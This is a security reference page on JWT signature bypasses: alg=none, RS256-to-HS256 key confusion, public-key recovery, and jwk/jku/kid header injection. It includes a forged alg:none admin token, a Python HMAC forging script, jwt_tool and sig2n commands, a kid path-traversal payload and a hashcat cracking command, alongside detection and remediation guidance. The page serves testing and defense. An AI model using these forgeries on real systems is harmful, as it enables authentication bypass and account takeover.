---
title: "JWT algorithm confusion and signature bypass: alg=none, RS256-to-HS256 key confusion, and header injection"
description: How verifier code is tricked into accepting forged JSON Web Tokens—through the none algorithm, RS256/HS256 key confusion, and jwk/jku/kid header abuse—with concrete payloads, detection, and remediation.
keywords:
  - JWT
  - JSON Web Token
  - algorithm confusion
  - alg none
  - RS256 HS256
  - signature bypass
  - jwt_tool
---

# JWT algorithm confusion

A signature-verification bypass in which the server is persuaded to accept a JSON Web Token (JWT) whose claims the attacker controls. The token's `alg` header is attacker-supplied, so a verifier that trusts it can be steered onto a code path that uses the wrong key material—or no signature check at all. The practical impact is **authentication bypass and privilege escalation**: forge `{"sub":"administrator"}` and become any user.

> **Scope.** This page is for authorized testing, CTF labs, and code review of systems you own or are contracted to assess. Forging tokens against third-party issuers or production systems without written authorization is unlawful.

## Overview

A JWT is three base64url segments joined by dots—`header.payload.signature`—where the signature covers `base64url(header) + "." + base64url(payload)` (RFC 7519, RFC 7515). The header's `alg` parameter declares how that signature was produced, e.g. `HS256` (HMAC-SHA-256, symmetric shared secret) or `RS256` (RSA-SHA-256, asymmetric private/public keypair).

The vulnerability class exists because **the verifier reads `alg` from data the attacker controls** and dispatches verification accordingly. RFC 7519 already warns that an application SHOULD reject a JWT "unless the algorithms used in the JWT are acceptable to the application"—the bugs below are all failures to enforce that.

Prerequisites for exploitation: you can read and modify a token the application trusts (typically a session cookie or `Authorization: Bearer`), and the verifier mishandles `alg`, the signature, or a key-selection header (`jwk`, `jku`, `kid`).

## How it works

### The `none` algorithm (unsecured JWT)

RFC 7515 defines an *Unsecured JWS* as one with `alg` set to `none` "and with the empty string for its JWS Signature value." A library that honors `none` skips signature verification entirely and reports the token as valid. The header is simply:

```json
{ "alg": "none", "typ": "JWT" }
```

A forged admin token is the header and payload, base64url-encoded, followed by a **trailing dot with nothing after it**:

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbmlzdHJhdG9yIn0.
```

The trailing dot is required—the payload segment must still be terminated even though the signature is empty. Servers that blocklist the literal string `none` can sometimes be bypassed with mixed case (`None`, `nOnE`) or alternative encodings, because the comparison happens before normalization.

A close relative is the **null-signature** bypass (CVE-2020-28042): `alg` stays `RS256`, but the signature segment is truncated to zero length and a logic error causes verification to be skipped.

### RS256 → HS256 key confusion

Many libraries expose an algorithm-agnostic `verify(token, key)` that decides RSA-versus-HMAC from the token's `alg`. A developer who only ever issues RS256 tokens passes the **RSA public key** as that single `key` argument, assuming the function only does asymmetric verification:

```js
// Vulnerable pattern (Node, jsonwebtoken-style API)
const publicKey = fs.readFileSync("public.pem");
jwt.verify(token, publicKey);          // no `algorithms` allowlist
```

When the attacker changes `alg` to `HS256`, the library computes `HMAC-SHA256(message, publicKey)`—it treats the public key as the HMAC secret. Because the RSA public key is, by definition, public, the attacker already possesses the exact byte string the server uses as the HMAC key. Forgery reduces to:

```
forgedToken = HS256_sign(attackerPayload, secret = serverRSAPublicKey)
```

## Exploitation

### 1 — `alg:none` forgery

Decode the token, set `alg` to `none`, edit the payload, and drop the signature (keep the trailing dot). With [jwt_tool](https://github.com/ticarpi/jwt_tool):

```bash
# Tamper interactively, or use the exploit mode for alg:none (CVE-2015-9235).
python3 jwt_tool.py <JWT> -X a
```

> jwt_tool's `-X` mode letters have shifted across releases—confirm with `python3 jwt_tool.py -h`. In current builds: `-X a` = alg:none, `-X n` = null signature, `-X k` = key confusion, `-X i` = `jwk` injection, `-X s` = `jku` spoofing.

### 2 — RS256 → HS256 confusion (public key known)

**(a) Obtain the public key.** Standard JWKS endpoints expose it:

```
GET /.well-known/jwks.json
GET /jwks.json
GET /.well-known/openid-configuration   →   "jwks_uri": "..."
```

returning a JWK Set:

```json
{ "keys": [ { "kty": "RSA", "e": "AQAB", "kid": "75d0ef47-...", "n": "o-yy1wpYmffg..." } ] }
```

**(b) Format it exactly.** This is the step that most often fails. The bytes you HMAC-sign with must be **byte-for-byte identical** to the key as the server holds it in memory, usually a PEM string. Enumerate these variants and try each:

- **PKCS#1 (`-----BEGIN RSA PUBLIC KEY-----`) vs X.509 SubjectPublicKeyInfo (`-----BEGIN PUBLIC KEY-----`)** — different byte strings, different HMACs. This exact ambiguity made fast-jwt CVE-2023-48223 exploitable: its PEM matcher only recognized `-----BEGIN PUBLIC KEY-----`.
- **Trailing newline** — PEM files usually end with `\n`; include and exclude it.
- **Line wrapping** at 64 characters is part of the signed bytes.
- **PEM text vs decoded DER** — sign with the PEM *string*, not the decoded DER.

**(c) Forge.** Using the PEM bytes as the HMAC secret. A raw implementation avoids modern libraries that refuse asymmetric keys on HMAC paths:

```python
import hashlib, hmac, base64, json

def b64(b): return base64.urlsafe_b64encode(b).rstrip(b"=")

pub = open("public.pem", "rb").read()          # exact PEM bytes, incl. trailing \n
header  = b64(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
payload = b64(json.dumps({"sub": "administrator"},       separators=(",", ":")).encode())
signing_input = header + b"." + payload
sig = b64(hmac.new(pub, signing_input, hashlib.sha256).digest())
print((signing_input + b"." + sig).decode())
```

Or with jwt_tool when the verifier is permissive:

```bash
python3 jwt_tool.py <JWT> -X k -pk public.pem
```

In Burp's JWT Editor the documented flow is: import the JWK as an RSA key → export as PEM → base64-encode the PEM → create a Symmetric Key whose `k` is that base64 → sign with HS256.

### 3 — Recovering the public key from two tokens (no exposed key)

When no JWKS is published, the RSA modulus can be recovered from two captured RS256 tokens. Verification computes `s^e mod n = padded_hash`, so `s^e − padded_hash` is a multiple of `n`; with two tokens, `GCD(s1^e − h1, s2^e − h2)` recovers `n` (assuming the standard exponent `e = 65537`). PortSwigger ships a wrapper:

```bash
docker run --rm -it portswigger/sig2n <token1> <token2>
```

It prints one or more candidate keys as base64-encoded PEM in both X.509 and PKCS#1 form, plus a forged token per candidate. Submit each candidate's forgery (e.g. in Burp Repeater) until one verifies. The upstream tool is [silentsignal/rsa_sign2n](https://github.com/silentsignal/rsa_sign2n) (related to CVE-2017-11424).

## Related header-injection variants

- **`jwk` (embedded key).** The attacker signs with their own private key and embeds the matching public key in the token header. Vulnerable verifiers trust the inline key. jwt_tool `-X i` (CVE-2018-0114 class).
- **`jku` / `x5u` (key-set URL).** The verifier fetches keys from a URL in the header; the attacker hosts their own JWKS. Hardened servers allowlist the host, but URL-parser discrepancies can bypass it. jwt_tool `-X s`.
- **`kid` path traversal.** `kid` selects a key file; pointing it at a predictable file lets the attacker know the key. Classic payload: `{"kid":"../../../../dev/null","alg":"HS256"}`, then HMAC-sign with the empty string (the contents of `/dev/null`).
- **`kid` SQL injection.** If keys are looked up from a database by `kid`, that value is an injection sink that can return an attacker-known key.
- **Weak HMAC secret.** If the app legitimately uses HS256 with a guessable secret, crack it offline: `hashcat -a 0 -m 16500 <jwt> <wordlist>` (mode 16500 = JWT), or `jwt_tool <JWT> -C -d wordlist.txt`.

## Detection (code review)

Trace the verify function: which algorithms are accepted, where the key bytes come from, and whether `none` and zero-length signatures are rejected. Red flags:

- A single key variable passed for all algorithms; HMAC and RSA sharing one verification path.
- No explicit algorithm allowlist.
- Confusing `decode()` with `verify()`—e.g. Node `jwt.decode(token)` does **no** signature check at all.

Grep targets by library:

- **Node `jsonwebtoken`:** `jwt.verify(` without an `algorithms: [...]` option; any `jwt.decode(` used for trust.
- **PyJWT:** `jwt.decode(` missing `algorithms=[...]` (older versions trusted the header `alg`).
- **python-jose:** `jwt.decode(...)`—confirm `algorithms=` is pinned.
- **Java (jjwt / Nimbus):** parser not constrained to an expected `JWSAlgorithm`.
- **Go (`golang-jwt/jwt`):** a `Keyfunc` that ignores `token.Method`/doesn't assert `*SigningMethodRSA` vs `*SigningMethodHMAC`.

Affected libraries / CVEs to recognize: CVE-2015-9235 (node-jsonwebtoken `< 4.2.2`, `alg:none` + HMAC/RSA confusion), CVE-2016-10555 (`jwt-simple`), CVE-2017-11424 (PyJWT key confusion), CVE-2018-0114 (key injection), CVE-2020-28042 (null signature), CVE-2023-48223 (fast-jwt `< 3.3.2`). The original 2015 disclosure named node-jsonwebtoken, pyjwt, namshi/jose, php-jwt, and jsjwt.

## Remediation

1. **Allowlist algorithms explicitly:** `jwt.verify(token, key, { algorithms: ['RS256'] })` / PyJWT `algorithms=['RS256']`. The canonical API fix is `verify(token, algorithm, key)` so the algorithm is caller-supplied, not header-derived.
2. **Separate HMAC and asymmetric paths**—never accept both with a shared key.
3. **Reject `none`** (and mixed-case/encoded variants) and **reject zero-length signatures**.
4. **Bind each `kid` to one key and one permitted algorithm;** never derive the algorithm from the header.
5. **Pin `jku`/`x5u` to a fixed trusted origin** (or ignore them and `jwk` from untrusted tokens entirely); canonicalize and strictly validate the URL.
6. **Use strong, rotated HMAC secrets;** never ship default or placeholder secrets.

## Tools

- **[jwt_tool](https://github.com/ticarpi/jwt_tool)** — tampering, `alg:none`, key confusion, header-injection modes, secret cracking.
- **Burp Suite — JWT Editor** extension — in-flow forging and key import.
- **[rsa_sign2n](https://github.com/silentsignal/rsa_sign2n) / `portswigger/sig2n`** — public-key recovery from two tokens.
- **hashcat** (`-m 16500`) — offline HS256 secret cracking.

## References

- PortSwigger Web Security Academy — [JWT attacks](https://portswigger.net/web-security/jwt) and [Algorithm confusion attacks](https://portswigger.net/web-security/jwt/algorithm-confusion)
- RFC 7519 — [JSON Web Token](https://datatracker.ietf.org/doc/html/rfc7519); RFC 7515 — [JSON Web Signature](https://datatracker.ietf.org/doc/html/rfc7515)
- Tim McLean — [Critical vulnerabilities in JSON Web Token libraries](https://www.chosenplaintext.ca/2015/03/31/jwt-algorithm-confusion.html) (original 2015 disclosure)
- Silent Signal — [Abusing JWT public keys without the public key](https://blog.silentsignal.eu/2021/02/08/abusing-jwt-public-keys-without-the-public-key/)
- GitHub Advisory — [GHSA-c2ff-88x2-x9pg (CVE-2023-48223, fast-jwt)](https://github.com/advisories/GHSA-c2ff-88x2-x9pg)

## See also

- [Authentication (parent)](index.md)
- [OAuth redirect misconfiguration](oauth-redirect-misconfiguration.md)
- [Session fixation](session-fixation.md)
